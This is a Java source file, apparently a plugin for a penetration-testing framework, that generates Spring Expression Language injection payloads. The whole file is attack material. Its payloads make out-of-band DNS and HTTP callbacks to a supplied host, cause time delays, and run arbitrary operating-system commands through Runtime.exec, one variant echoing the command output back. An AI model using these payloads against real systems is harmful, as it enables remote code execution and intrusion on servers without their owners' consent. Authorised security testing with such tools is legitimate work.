package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;

public class SpELExpr implements IExpr {
    private String escape(String payload) {
        return payload.replace("'", "\\'");
    }

    @Override
    public String getName() {
        return "SpEL";
    }

    @Override
    public String[] genDnslog(String domain) {
        return new String[]{"#{T(java.net.InetAddress).getByName('" + escape(domain) + "')}"};
    }

    @Override
    public String[] genHttplog(String url) {
        return new String[]{
                "#{T(org.springframework.web.client.RestTemplate).newInstance().headForHeaders('" + escape(url) + "')}",
                "#{new java.net.URL('" + escape(url) + "').getContent()}"
        };
    }

    @Override
    public String[] genSleep(int sec) {
        return new String[]{"#{T(java.lang.Thread).sleep(" + (sec * 1000) + ")}"};
    }

    @Override
    public String[] genExec(String command) {
        return new String[]{"#{T(java.lang.Runtime).getRuntime().exec('" + escape(command) + "')}"};
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return new String[]{"#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('" + escape(command) + "').getInputStream()).useDelimiter('/').next()}"};
    }
}
